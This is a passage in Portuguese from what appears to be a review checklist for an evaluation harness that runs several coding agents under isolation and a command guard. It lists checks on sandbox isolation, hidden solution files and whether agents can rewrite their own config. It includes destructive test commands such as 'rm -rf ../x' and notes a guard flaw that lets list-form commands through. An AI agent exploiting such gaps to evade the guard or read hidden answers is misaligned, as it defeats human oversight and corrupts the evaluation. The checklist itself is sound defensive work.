| M9 | menor | `agents/README.md` "Edição: livre dentro do projeto" vale só para as ferramentas de edição: no autonomous o shell escreve em qualquer lugar, e `rm` simples, `mv`, `truncate` e `>` fora do projeto passam pela guarda. | Dizer isso explicitamente na tabela de permissões. |

## Só dá para verificar em execução (depois da E4)

1. **Isolamento real.** Instalar com o B1 corrigido. Depois rodar cada agente uma vez, de preferência no container ou com uma HOME descartável no host. Conferir que nada foi criado ou alterado em `~/.claude`, `~/.claude.json`, `~/.codex`, `~/.gemini`, `~/.qwen`, `~/.config/opencode`, `~/.local/share/opencode`, `~/.cache/opencode`, `~/.pi`, `~/.agents` e `~/.cache/claude-cli-nodejs`. Usar `find -newer <marcador>`. A data de `~/.claude` não serve, porque a sessão do orquestrador mexe nela.
2. **Pastas de skills fora da config isolada.** Ver se Codex, Pi ou Qwen leem `~/.agents/skills` (existe nesta máquina) mesmo com `CODEX_HOME`/`PI_CODING_AGENT_DIR`/`QWEN_HOME`. Isso afeta os lançadores interativos no host.
3. **Config aceita pela versão fixada.**
   - Qwen: `$version: 4`, `goals`, `tools.disabled`, `hooks` com `name`.
   - Codex: `--profile autonomous` lido de `$CODEX_HOME/autonomous.config.toml`. Se não for lido, o eval roda com outra aprovação ou outro sandbox.
   - Pi: `apiKey: "$LOCAL_LLM_API_KEY"` resolvida e `-e guard.ts` carregada em `--mode json`.
   - OpenCode: a flag `--auto` existe na 1.19.5, e o plugin carrega sem baixar `@opencode-ai/plugin` (sem rede no container).
   - Claude: `--exclude-dynamic-system-prompt-sections` e `--setting-sources user`.
4. **A guarda dispara em cada agente.**
   - Pedir `git push` e `rm -rf ../x` e conferir no `guard.log`.
   - Codex: o `tool_input.command` chega como **string**. Se vier como lista, o `guard.py` faz `str(lista)` e libera tudo.
   - Qwen: o hook roda no YOLO.
   - Claude: `deny` + hook valem no bypass, como usuário não root no container.
   - Repetir os casos da seção 4 depois da correção do I2.
5. **Claude local aninhado.** Com `CLAUDECODE` herdado no host, ver se o `claude -p` recusa ou se liga à sessão pai. No container, conferir que a variável não chega.
6. **Endpoints.**
   - `/v1/messages`: thinking, temperatura vinda de `CLAUDE_CODE_EXTRA_BODY`, `count_tokens`.
   - `/v1/responses`: itens `reasoning` com `content`, `apply_patch` pelo shell.
   - Amostragem chegando ao servidor, conferida com `--verbose`.
   - Número de requisições por turno.
7. **`agent-metrics.json` contra o `events.jsonl`.** Em especial, ver se o Claude Code repete blocos entre eventos `assistant` da mesma mensagem: isso contaria chamadas em dobro e acusaria laços falsos.
8. **Primeira execução real do eval pelo `EVAL_WRAPPER`.**
   - Rodar S1–S3 com 1 agente.
   - Confirmar que `hidden/` e `solution.patch` não estão visíveis no container.
   - Medir o tempo das verificações e conferir o `TZ`.
   - Ver se o agente consegue reescrever a própria config em `<log-dir>/home` (M3).
9. **Gabaritos.** T1 e T6 com corretor humano, e o T5 conferido à mão até o I6 ser corrigido.
